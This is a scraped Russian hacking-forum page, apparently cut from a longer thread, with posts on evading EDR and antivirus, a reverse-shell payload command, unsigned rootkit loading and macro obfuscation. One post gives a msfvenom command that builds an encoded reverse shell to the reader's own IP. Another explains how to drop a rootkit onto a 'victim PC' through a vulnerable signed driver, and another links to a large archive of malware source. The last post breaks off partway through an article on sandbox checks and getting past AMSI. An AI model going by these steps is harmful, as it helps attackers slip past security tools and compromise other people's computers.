Когда происходит событие, ОС вызывает зарегистрированную функцию обратного вызова и уведомляет код в режиме ядра о том, что это произошло. Этот &quot;код в режиме ядра&quot; может быть драйвером устройства, созданным продуктами безопасности, в данном случае - это EDR.<br />
<br />
Стоит отметить, что плохо написанные или неправильно настроенные обратные вызовы могут вызвать нестабильность системы, проблемы с производительностью или даже уязвимости безопасности, поэтому этот метод не используется всеми производителями EDR.<br />
<br />
Некоторые примеры обратных вызовов перечислены ниже.<br />
<br />
<b>PspCreateProcessNotifyRoutine</b> - регистрирует обратный вызов, предоставленный драйвером, который будет вызываться каждый раз при создании или удалении процесса.<br />
<br />
<b>PspLoadImageNotifyRoutine</b> - регистрирует обратный вызов, предоставленный драйвером, который будет вызываться каждый раз, когда образ(DLL или EXE) загружается (или отображается) в памяти.<br />
<br />
<b>CmRegisterCallbackEx</b> - регистрирует обратный вызов, предоставленный драйвером, который будет вызываться каждый раз, когда поток работает с реестром. Для перехвата, изучения и потенциальной блокировки событий ввода-вывода Microsoft рекомендует поставщикам безопасности использовать драйверы minifilter.<br />
<br />
Драйверы minifilter используются в операционной системе Windows для перехвата и модификации запросов ввода-вывода между приложениями и файловой системой. Эти драйверы работают на уровне между файловой системой и драйвером устройства, который обрабатывает физические запросы ввода-вывода. EDR может использовать драйверы minifilter для регистрации обратного вызова для каждой операции ввода-вывода, которая уведомит драйвер о конкретных действиях, таких как создание процесса, изменение реестра и т. д.<br />
<br />
Кроме того, обратные вызовы ядра могут быть зарегистрированы компонентом Minifilter EDR для получения неизмененных данных напрямую из ядра, а не из ресурсов пользовательского пространства, так как они могут быть подделаны и изменены.<br />
<br />
Пример того, как EDR может использовать драйверы minifilter и обратные вызовы ядра, - вызов PspCreateProcessNotifyRoutine для активации EDR для загрузки его DLL в режиме пользователя в созданные процессы, в котором он может выполнять перехват системного вызова, а затем использовать функциональность драйвера minifilter для мониторинга запросов файловой системы ввода-вывода этим вновь созданным процессом.<br />
<br />
<b>Сетевые IoC</b><br />
<br />
Процессы, устанавливающие сетевые соединения, вызывают большее подозрение из-за возможности соединения с сервером C&amp;C, контролируемым атакующим. Соединения с сетью будут отслеживаться EDR, и будет сгенерировано предупреждение, когда процесс, который обычно не использует сетевое соединение, начнет это делать. Например, если была выполнена инъекция в процесс notepad.exe, и он начал соединяться с интернетом, это считается высоко подозрительным. Кроме того, анализируются аспекты сетевого соединения, такие как целевой IP-адрес, доменное имя, номер порта и сетевой трафик.<br />
<br />
<b>Обход EDR</b><br />
<br />
Обход EDR может быть сложным сначала и требует группы методов и техник, а не полагания на один подход. Причина, по которой требуются несколько методов, заключается в том, что EDR использует более одной техники для мониторинга процесса.<br />
Иногда могут потребоваться несколько реализаций для решения одной и той же проблемы.<br />
<br />
Важно помнить, что некоторые техники обхода EDR позволяют загрузчику избежать обнаружения,<b><u> но не используемой в нем полезный нагрузка C&amp;C.</u></b> Это может быть связано с несколькими причинами:<br />
<br />
Аномалии сети C&amp;C хорошо известны и подписаны EDR. Загрузчик использует прямые/косвенные системные вызовы и успешно избежал обнаружения, <b>но полезная нагрузка C&amp;C этого не делает и по-прежнему использует подключенные функции. </b><br />
<br />
Полезная нагрузка C&amp;C выполнила детектируемую команду, либо намеренно, либо ненамеренно. Такие команды привлекут внимание EDR, и ваша реализация будет обнаружена (например, запустите cmd.exe и выполните команду whoami).<br />
<br />
C&amp;C использует узнаваемые именованные дескрипторы IPC или открывает конкретные (напомним, что IPC - это мьютексы, семафоры, сокеты). Например, выполнение команды &quot;load powershell&quot; с использованием Meterpreter приводит к следующему.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795165049.png"
		data-src="https://osint42.org/attachments/1746795165049-png.317/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795165049-png.317/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795165049.png"
			title="1746795165049.png"
			width="1691" height="879" loading="lazy" />
	</div><br />
<br />
По таким и многим другим причинам будет много случаев, когда ваша реализация успешно установит соединение с вашим сервером C2, но будет обнаружена при выполнении некоторых конкретных команд. Поэтому выбор вашего C2 является важным решением для уклонения во время выполнения. Всегда рекомендуется использовать гибкую и поддающуюся модификации структуру C2, а не ограниченную.</div>
						

							<h2>Про детект в памяти. Ничего не поделаешь и это неизбежно)</h2>

							

							

							<div class="bbWrapper">Всем привет!<br />
<br />
Хотел ещё добавить:<br />
<br />
Вот в этой теме:Обход EDRs.Последняя тема цикла | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
Был поднят вопрос детекта памяти, да можно использовать такие штуки:Открываем врата ада | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
Но тем не менее важно что-бы сама нагрузка тоже не палилась, в теме про EDR  про это сказано.<br />
<br />
Также неплохо, при проектировании вашего основного зверька или полезной нагрузки учитывать методы антиотладки и морфинга самой полезной нагрузки.<br />
<br />
Это можно делать прям в памяти, перед запуском, вот например я использовал такой механизм в крипторе:<a href="https://github.com/XShar/Run_pe_cryptor_frame/tree/master/modules/simple_mutate_pe" target="_blank" class="link link--external" rel="noopener">Run_pe_cryptor_frame/modules/simple_mutate_pe at master · XShar/Run_pe_cryptor_frame</a><br />
<br />
На вход подаётся бинарный код, на выходе по возможности мутируются, т.е. меняются опкоды на аналоги.<br />
Уже какие-то антивирусы могут не детектить, всё зависит от настройки эвристики антивируса.<br />
<br />
Также если у вас есть исходный код нагрузки, можете использовать различные приёмы генерации мусорного кода, например вот:<a href="https://github.com/XShar/super_gen_trash_c" target="_blank" class="link link--external" rel="noopener">GitHub - XShar/super_gen_trash_c: Генерация кода на си</a><br />
Техники задержек и прочее как в темах Черпаем силы в антиотладке | Цикл статей &quot;Изучение вредоносных программ&quot; и Уменьшение вероятности детекта зверька | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
Если вы-же генерируете нагрузку фреймворками, то обязательно включайте опции обфускации  и защиты, вот примеры:<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-1-metasploit"></a>1. Metasploit&#8203;<a class="hoverLink" href="#-1-metasploit" title="Постоянная ссылка"></a></h3>Metasploit также предоставляет различные кодировщики для обфускации payload. Например:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>msfvenom -p windows/shell_reverse_tcp LHOST=ВАШ_IP LPORT=4444 -f c -e x86/shikata_ga_nai -i 3</code></pre>
	</div>
</div><br />
Здесь -e x86/shikata_ga_nai указывает использовать кодировщик shikata_ga_nai, а -i 3 указывает применить кодировщик 3 раза.<br />
<br />
<b>shikata_ga_nai</b> — это один из наиболее популярных кодировщиков в Metasploit. Его название происходит от японского выражения &quot;仕方がない&quot;, что можно перевести как &quot;ничего не поделаешь&quot; или &quot;это неизбежно&quot;.<br />
<br />
В контексте Metasploit, shikata_ga_nai используется для обфускации шеллкода с целью избежать обнаружения антивирусами или IDS/IPS системами. Этот кодировщик использует полиморфную технику, что означает, что каждый раз, когда он используется, он генерирует уникальный обфусцированный шеллкод, даже если исходный шеллкод остается неизменным.<br />
Вот некоторые особенности shikata_ga_nai:<br />
<ol>
<li data-xf-list-type="ol"><b>Полиморфизм</b>: Каждое обфусцирование уникально.</li>
<li data-xf-list-type="ol"><b>Размер</b>: Кодировщик может генерировать шеллкоды разного размера, что может быть полезно для эксплуатации различных уязвимостей.</li>
<li data-xf-list-type="ol"><b>Динамическая настройка ключа</b>: shikata_ga_nai использует динамически изменяющийся ключ для кодирования данных, что делает его сложнее для статического анализа.</li>
<li data-xf-list-type="ol"><b>Регистровая независимость</b>: Кодировщик спроектирован таким образом, чтобы не зависеть от конкретных регистров, что увеличивает вероятность успешного выполнения шеллкода в различных условиях.</li>
</ol>Несмотря на его эффективность, со временем многие современные системы обнаружения угроз стали узнавать паттерны, связанные с этим кодировщиком. Тем не менее, в некоторых сценариях и с правильной комбинацией других техник обфускации, он все еще может быть эффективным.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-2-veil"></a>2. Veil&#8203;<a class="hoverLink" href="#-2-veil" title="Постоянная ссылка"></a></h3><a href="https://github.com/Veil-Framework/Veil" target="_blank" class="link link--external" rel="noopener"><b>Veil</b></a> — это инструмент для создания обфусцированных payloads, чтобы избежать обнаружения.<br />
<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-sozdaniye-i-morfing-payload"></a>Создание и морфинг payload:&#8203;<a class="hoverLink" href="#-sozdaniye-i-morfing-payload" title="Постоянная ссылка"></a></h4>После установки Veil, запустите его:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>Veil.py</code></pre>
	</div>
</div><br />
<b>Итог:</b><br />
<br />
Для обхода детекта в памяти и детекта по поведению, сама нагрузка и итоговый зверек должен быть чистым.<br />
Все остальные инструменты помогают сделать запуск зверька скрытым, но не позволяют избежать поведение связанное с запущенным вредоносным кодом.)</div>
						

							<h2>Огромная база исходников современных вирусов для разных платформ</h2>

							

							

							<div class="bbWrapper">Весь исходный код, который упакован, может быть или не быть установлен с паролем &#039;infected&#039; (без кавычек). Отдельные файлы, вероятно, не упакованы.<br />
<br />
Структура каталогов:<br />
<ul>
<li data-xf-list-type="ul">Android<ul>
<li data-xf-list-type="ul">Generic Android OS malware, some leaks and proof-of-concepts</li>
</ul></li>
<li data-xf-list-type="ul">Engines<ul>
<li data-xf-list-type="ul">BAT</li>
<li data-xf-list-type="ul">Linux</li>
<li data-xf-list-type="ul">VBS</li>
<li data-xf-list-type="ul">Win32</li>
</ul></li>
<li data-xf-list-type="ul">Java<ul>
<li data-xf-list-type="ul">Some java infectors, proof-of-concept ransomware</li>
</ul></li>
<li data-xf-list-type="ul">Javascript<ul>
<li data-xf-list-type="ul">In-browser malware</li>
</ul></li>
<li data-xf-list-type="ul">Legacy Windows<ul>
<li data-xf-list-type="ul">Win2k</li>
<li data-xf-list-type="ul">Win32</li>
<li data-xf-list-type="ul">Win95</li>
<li data-xf-list-type="ul">Win98</li>
<li data-xf-list-type="ul">Win9x</li>
<li data-xf-list-type="ul">WinCE</li>
</ul></li>
<li data-xf-list-type="ul">Libs (libraries)<ul>
<li data-xf-list-type="ul">Bootkits</li>
<li data-xf-list-type="ul">DDoS proof-of-concepts</li>
<li data-xf-list-type="ul">Win32 libraries (disassemblers, etc).</li>
</ul></li>
<li data-xf-list-type="ul">Linux<ul>
<li data-xf-list-type="ul">Backdoors</li>
<li data-xf-list-type="ul">Botnets</li>
<li data-xf-list-type="ul">Infectors</li>
<li data-xf-list-type="ul">Mirai-Family (related and/or spin-offs)</li>
<li data-xf-list-type="ul">Rootkits</li>
<li data-xf-list-type="ul">Tools</li>
<li data-xf-list-type="ul">Trojans</li>
</ul></li>
<li data-xf-list-type="ul">MSDOS</li>
<li data-xf-list-type="ul">MSIL</li>
<li data-xf-list-type="ul">MacOS</li>
<li data-xf-list-type="ul">Other<ul>
<li data-xf-list-type="ul">Acad malware</li>
<li data-xf-list-type="ul">FreeBSD malware</li>
<li data-xf-list-type="ul">SunOS malware</li>
<li data-xf-list-type="ul">Symbian OS malware</li>
<li data-xf-list-type="ul">Discord-specific malware</li>
</ul></li>
<li data-xf-list-type="ul">PHP<ul>
<li data-xf-list-type="ul">Albania family</li>
<li data-xf-list-type="ul">C99 family</li>
<li data-xf-list-type="ul">Crewcorp family</li>
<li data-xf-list-type="ul">Defacement Tools</li>
<li data-xf-list-type="ul">PHP Infectors</li>
<li data-xf-list-type="ul">Lanker family</li>
<li data-xf-list-type="ul">Macker family</li>
<li data-xf-list-type="ul">PhpSpy family</li>
<li data-xf-list-type="ul">R57-shell family</li>
</ul></li>
<li data-xf-list-type="ul">Panel (web panel collections)</li>
<li data-xf-list-type="ul">Perl<ul>
<li data-xf-list-type="ul">Various backdoors, hack tools, and infectors</li>
</ul></li>
<li data-xf-list-type="ul">Phishing<ul>
<li data-xf-list-type="ul">Collection of various phishing pages</li>
</ul></li>
<li data-xf-list-type="ul">Point of Sales malware</li>
<li data-xf-list-type="ul">Python<ul>
<li data-xf-list-type="ul">Hacktools, various exotic-malware (such as chastity belt ransomware)</li>
</ul></li>
<li data-xf-list-type="ul">Ruby</li>
<li data-xf-list-type="ul">Win32<ul>
<li data-xf-list-type="ul">Binders</li>
<li data-xf-list-type="ul">Botnets</li>
<li data-xf-list-type="ul">Crypters</li>
<li data-xf-list-type="ul">Exploit kits</li>
<li data-xf-list-type="ul">Infectors</li>
<li data-xf-list-type="ul">Internet worms</li>
<li data-xf-list-type="ul">Malware families</li>
<li data-xf-list-type="ul">Ransomware</li>
<li data-xf-list-type="ul">Rootkits</li>
<li data-xf-list-type="ul">Stealers</li>
</ul></li>
</ul>Ссылка на сборник:<a href="https://github.com/vxunderground/MalwareSourceCode/tree/main" target="_blank" class="link link--external" rel="noopener">GitHub - vxunderground/MalwareSourceCode: Collection of malware source code for a variety of platforms in an array of different programming languages.</a><br />
<br />
Зеркало с Мега:<br />
<br />
<div><a href="https://mega.nz/file/zsJWHRjA#JkXTsWQ0NX60NJ2jISkAuuCXOtMvd_GcSOwO0XNiFgQ" target="_blank" class="link link--external" rel="noopener">https://mega.nz/file/zsJWHRjA#JkXTsWQ0NX60NJ2jISkAuuCXOtMvd_GcSOwO0XNiFgQ</a></div></div>
						

							<h2>Как RootKit загрузить или же как загрузить драйвер без подписи</h2>

							

							

							<div class="bbWrapper">Для начала давайте разберемся что такое RootKit?<br />
<br />
RootKit - это тип вредоносного программного обеспечения, который предоставляет хакерам доступ к целевым компьютерам. RootKit может скрывать свое присутствие, но оставаться активным. Как только они получают несанкционированный доступ к компьютерам, RootKit позволяют киберпреступникам красть личные данные и финансовую информацию, устанавливать вредоносное программное обеспечение или использовать компьютеры как часть ботнета для распространения спама и участия в DDoS-атаках.<br />
<br />
Название “RootKit” происходит от операционных систем Unix и Linux, где наиболее привилегированный аккаунт администратора называется “root”. Приложения, которые позволяют несанкционированный доступ root или admin к устройству, известны как &quot;kit&quot;.<br />
<br />
Для того что бы RootKit смог запуститься на пк жертвы, есть 2 варианта:<br />
<ol>
<li data-xf-list-type="ol">Заплатить от 150$ за подпись драйвера</li>
<li data-xf-list-type="ol">Использовать маппер который с помощью уязвимого драйвера (на котором уже есть подпись) загрузит ваш RootKit.</li>
</ol>Первый вариант нам не подходит, так-как сертификат могут забанить, да и вообще, зачем платить если мы можем это сделать бесплатно?)<br />
<br />
Для второго варианта нам потребуется kdmapper, для примера можем взять этот <a href="https://github.com/TheCruZ/kdmapper" target="_blank" class="link link--external" rel="noopener">GitHub - TheCruZ/kdmapper: KDMapper is a simple tool that exploits iqvw64e.sys Intel driver to manually map non-signed drivers in memory</a><br />
<br />
Данные варианты работают как на Win10, так и на Win11 (думаю на ОС версии ниже они тоже должны работать).<br />
После того как у вас есть RootKit, вы можете перевести его в байты с помощью HxD, что бы вставить прям в маппер для удобства.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795800440.png"
		data-src="https://osint42.org/attachments/1746795800440-png.318/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795800440-png.318/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795800440.png"
			title="1746795800440.png"
			width="575" height="682" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795808057.png"
		data-src="https://osint42.org/attachments/1746795808057-png.319/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795808057-png.319/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795808057.png"
			title="1746795808057.png"
			width="643" height="676" loading="lazy" />
	</div><br />
<br />
1 скриншот если не ошибаюсь, это уязвимый драйвер, а 2 наш руткит.<br />
Далее дописываем сурс маппера так, что бы он дропал данные файлы в TEMP папку.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795873489.png"
		data-src="https://osint42.org/attachments/1746795873489-png.321/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795873489-png.321/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795873489.png"
			title="1746795873489.png"
			width="569" height="281" loading="lazy" />
	</div><br />
<br />
Получается примерно такое.<br />
Далее просто запускаем на пк жертвы наш маппер и он сделает всё остальное за вас.<br />
<br />
На этом всё, я упустил много вещей в статье, но думаю кому надо, тот сможет разобраться в этом.<br />
Возможно если будет желание, то я напишу 2 часть по созданию RootKit&#039;a, но это вряд-ли будет скоро, ибо я сам не совсем разбираюсь в создании драйверов и это был мой первый опыт в написании руткитов.<br />
<br />
Также есть готовые руткиты для винды, например вот, список:<br />
<br />
<div><a href="https://github.com/XaFF-XaFF/Cronos-Rootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/XaFF-XaFF/Cronos-Rootkit</a></div><br />
<div><a href="https://github.com/ZeroMemoryEx/Chaos-Rootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/ZeroMemoryEx/Chaos-Rootkit</a></div><br />
<div><a href="https://github.com/XaFF-XaFF/Black-Angel-Rootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/XaFF-XaFF/Black-Angel-Rootkit</a></div><br />
Последний кстати прикольный, вот его функции:<br />
<ul>
<li data-xf-list-type="ul">DSE Bypass (No need to turn test signing on)</li>
<li data-xf-list-type="ul">KPP Bypass</li>
<li data-xf-list-type="ul">Hide processes</li>
<li data-xf-list-type="ul">Hide ports (TCP/UDP)</li>
<li data-xf-list-type="ul">Process permission elevation</li>
<li data-xf-list-type="ul">Process protection</li>
<li data-xf-list-type="ul">Shellcode injector (Unkillable shellcode. Even if process dies, shellcode can still run)</li>
<li data-xf-list-type="ul">(TODO) Hide files/directories</li>
<li data-xf-list-type="ul">(TODO) Hide registry keys</li>
</ul><b>Ахренительный руткит:<div><a href="https://github.com/Idov31/Nidhogg" target="_blank" class="link link--external" rel="noopener">https://github.com/Idov31/Nidhogg</a></div></b><ul>
<li data-xf-list-type="ul">Process hiding and unhiding</li>
<li data-xf-list-type="ul">Process elevation</li>
<li data-xf-list-type="ul">Process protection (anti-kill and dumping)</li>
<li data-xf-list-type="ul">Bypass pe-sieve</li>
<li data-xf-list-type="ul">Thread hiding</li>
<li data-xf-list-type="ul">Thread protection (anti-kill)</li>
<li data-xf-list-type="ul">File protection (anti-deletion and overwriting)</li>
<li data-xf-list-type="ul">File hiding</li>
<li data-xf-list-type="ul">Registry keys and values protection (anti-deletion and overwriting)</li>
<li data-xf-list-type="ul">Registry keys and values hiding</li>
<li data-xf-list-type="ul">Querying currently protected processes, threads, files, registry keys and values</li>
<li data-xf-list-type="ul">Arbitrary kernel R/W</li>
<li data-xf-list-type="ul">Function patching</li>
<li data-xf-list-type="ul">Built-in AMSI bypass</li>
<li data-xf-list-type="ul">Built-in ETW patch</li>
<li data-xf-list-type="ul">Process signature (PP/PPL) modification</li>
<li data-xf-list-type="ul">Can be reflectively loaded</li>
<li data-xf-list-type="ul">Shellcode Injection<ul>
<li data-xf-list-type="ul">APC</li>
<li data-xf-list-type="ul">NtCreateThreadEx</li>
</ul></li>
<li data-xf-list-type="ul">DLL Injection<ul>
<li data-xf-list-type="ul">APC</li>
<li data-xf-list-type="ul">NtCreateThreadEx</li>
</ul></li>
<li data-xf-list-type="ul">Querying kernel callbacks<ul>
<li data-xf-list-type="ul">ObCallbacks</li>
<li data-xf-list-type="ul">Process and thread creation routines</li>
<li data-xf-list-type="ul">Image loading routines</li>
<li data-xf-list-type="ul">Registry callbacks</li>
</ul></li>
<li data-xf-list-type="ul">Removing and restoring kernel callbacks</li>
<li data-xf-list-type="ul">ETWTI tampering</li>
</ul><br />
В качестве дополнения мапер:<a href="https://github.com/TheCruZ/kdmapper" target="_blank" class="link link--external" rel="noopener">GitHub - TheCruZ/kdmapper: KDMapper is a simple tool that exploits iqvw64e.sys Intel driver to manually map non-signed drivers in memory</a><br />
<br />
Вот ещё относительно свежий<br />
<div><a href="https://github.com/gmh5225/CallMeWin32kDriver" target="_blank" class="link link--external" rel="noopener">https://github.com/gmh5225/CallMeWin32kDriver</a></div><br />
Вот ещё интересный сэмпл с защитой процесса от закрытия<br />
<div><a href="https://github.com/AdvDebug/MineRootkit" target="_blank" class="link link--external" rel="noopener">https://github.com/AdvDebug/MineRootkit</a></div></div>
						

							<h2>Обход AMSI</h2>

							

							

							<div class="bbWrapper">Очень познавательная статья с Хакера:<a href="https://xakep.ru/2022/07/15/macros-obfuscation" target="_blank" class="link link--external" rel="noopener">О6фy$kация. Обходим детект вредоносных макросов Word</a><br />
<br />
<b><u>И это ответ тем, кто считает что скриптами нельзя делать низкоуровневые вещи, можно всё при должном умении и знании...)</u></b><br />
<br />
Казалось бы, макровирусы давно и безвозвратно ушли в прошлое. Уж что‑что, а вредоносные макросы в документах Office современные антивирусные программы должны обнаруживать легко и непринужденно. Именно так и обстоят дела, если макрос, конечно, не обфусцирован. Эффективными приемами обхода антивирусного детекта зловредных VBA-макросов поделился в своей публикации  независимый исследователь Брендан Ортиз, а мы расскажем о его изысканиях тебе.<br />
<br />
Готовясь к сертификации OSEP, Брендан Ортиз наверняка выпил ведро кофе и перелопатил гигабайты технической документации. Насчет кофе мы не уверены, а вот то, что результатом этой подготовки стало <a href="https://depthsecurity.com/blog/obfuscating-malicious-macro-enabled-word-docs" target="_blank" class="link link--external" rel="noopener">масштабное и подробное исследование способов закладки VBA-макросов в самые обычные документы Word</a>, не подлежит никакому сомнению. Брендан убедился, что на сайте <a href="http://antiscan.me/" target="_blank" class="link link--external" rel="noopener">antiscan.me</a> (альтернатива <a href="http://virustotal.com/" target="_blank" class="link link--external" rel="noopener">virustotal.com</a>) оригинальный файл обнаруживался как минимум 7 антивирусными движками из 20. Тогда он всерьез взялся за обфускацию своих художеств и смог в итоге сбить показатель детектирования до 2 из 20. Поскольку антивирусные базы периодически обновляются, со временем этот параметр вырос с 2 до 5. Но все равно — результат получился впечатляющий.<br />
<br />




<blockquote data-attributes="" data-quote="" data-source=""
	class="bbCodeBlock bbCodeBlock--expandable bbCodeBlock--quote js-expandWatch">
	
	<div class="bbCodeBlock-content">
		
		<div class="bbCodeBlock-expandContent js-expandContent ">
			Вся информация в этой статье приводится исключительно в ознакомительных целях, автор и редакция не несут никакой ответственности за последствия использования этой публикации. Предупреждаем, что при выполнении макросов в документах Microsoft на твоем устройстве могут быть спровоцированы нежелательные действия.
		</div>
		<div class="bbCodeBlock-expandLink js-expandLink"><a role="button" tabindex="0">Нажмите, чтобы раскрыть...</a></div>
	</div>
</blockquote><br />
<b>Проверка эмуляции</b><br />
<br />
Многие антивирусы, использующие для детектирования вредоносов эвристику, запускают VBA-скрипты в «песочнице» с целью убедиться в их безопасности. Потому настоящие вирусописатели в первую очередь проверяют, работает ли их сценарий в эмулированной среде, и, если так — останавливают выполнение вредоносного пейлоада, чтобы антивирус не забил тревогу.<br />
<br />
Брендан Ортиз предложил три простых теста для определения эмулятора. Эти тесты располагаются в самом начале созданного им макроса и не позволяют ему выполнить никаких зловредных действий, если обнаружится, что скрипт запущен в изолированной среде.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="01.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26875%2F01.png&amp;hash=b50b0e1f38f2afbedc3d4e78dc0a03b2" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../01a461.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26875%2F01.png&amp;hash=b50b0e1f38f2afbedc3d4e78dc0a03b2"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26875/01.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="01.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Первый тест исследователь назвал «Document Name». Во многих случаях, когда антивирусный движок эмулирует выполнение макроса VBA, он меняет имя документа либо добавляет к этому имени некоторое число, чтобы отследить и предотвратить многократный запуск скрипта. Этот тест проверяет, совпадает ли с именем оригинального документа имя того документа, в котором выполняется полезная нагрузка.<br />
<br />
Чтобы зашифровать статическую строку, в которой хранится имя документа, используется сценарий PowerShell, а затем во время выполнения скрипта для ее расшифровки вызывается собственная функция Joy. Если имя активного документа не совпадает с указанным именем, проверка считается непройденной и выполняется выход из подпрограммы.<br />
<br />
На втором этапе проверяется путь. Если мы заранее знаем, из какой папки будет открыт документ с вредоносным сценарием (например, из папки «Загрузки» пользователя Windows), то мы можем сравнить ее с текущим путем. Несовпадение пути укажет на то, что скрипт, скорее всего, работает в антивирусном движке. В этом случае мы также выходим из подпрограммы.<br />
<br />
Наконец, простой тест на время. Когда скрипт выполняется в эмуляторе антивируса, тот обычно пропускает фрагменты кода, в которых реализована пауза или «засыпание», иначе любящие «поспать» макровирусы попросту завесят движок. Поэтому Брендан предложил следующую нехитрую проверку: фиксируем актуальное время, «спим» две секунды, а затем просыпаемся и вновь фиксируем время. Если разница между двумя этими значениями составит менее 2 секунд, скорее всего, мы в антивирусном движке. В этом случае подпрограмма также завершается.<br />
<br />
Если все три проверки завершились полным и безоговорочным успехом, макрос переходит к выполнению полезной нагрузки, которая выглядит примерно так, как показано на следующем рисунке.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="02.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26876%2F02.png&amp;hash=fed9cbb17b78da7814bc0126df782520" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../0290f0.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26876%2F02.png&amp;hash=fed9cbb17b78da7814bc0126df782520"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26876/02.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="02.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>Несколько слов об AMSI</b><br />
<br />
В ходе своих экспериментов Брендан Ортиз выяснил, что поначалу его вредоносный макрос успешно детектировался эвристикой большинства антивирусных движков. Кроме того, несмотря на многочисленные попытки исследователя запустить макрос при включенной защите Windows Defender, система убивала скрипт. По какой же причине макрос помечался как вредоносный? Все дело в том, что интерфейс <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" target="_blank" class="link link--external" rel="noopener">Anti-Malware Scan Interface (AMSI)</a> заглядывает в сценарий VBA и контролирует его поведение.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="03.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26877%2F03.png&amp;hash=0e596ba51523093cdcb5e4a971275649" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../036c6e.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26877%2F03.png&amp;hash=0e596ba51523093cdcb5e4a971275649"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26877/03.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="03.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
AMSI — это разработанный Microsoft интерфейс, который приспособлен к работе с любыми антивирусами и позволяет им запрашивать информацию о процессах, происходящих во время исполнения программ. Это значит, что антивирусу передаются даже бесфайловые угрозы, например команды PowerShell, если антивирус вызывает AMSI. Еще это означает, что ты можешь как угодно обфусцировать полезную нагрузку, но как только она деобфусцируется во время выполнения, AMSI начнет отслеживать поведение кода.<br />
<br />
Когда пользователь пытается выполнить команду в PowerShell, AMSI сначала загружает, а затем проверяет эту команду. Если обнаруживаются какие‑либо элементы, которые обычно используются для вредоносных действий, в частности, вызовы API Win32 или COM (то есть, срабатывают заложенные в  AMSI  «триггеры»), то AMSI приостанавливает подозрительный процесс.<br />
<br />
На картинке ниже показано, как VBA интегрируется с AMSI. С учетом всего этого исследователь стал искать способы ускользнуть от пристального внимания AMSI при выполнении скриптов VBA и PowerShell.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="04.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26878%2F04.png&amp;hash=a02d217f656f774b17a8aec7c743a7e4" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../04dea0.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26878%2F04.png&amp;hash=a02d217f656f774b17a8aec7c743a7e4"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26878/04.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="04.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>Импорт Windows API в VBA</b><br />
<br />
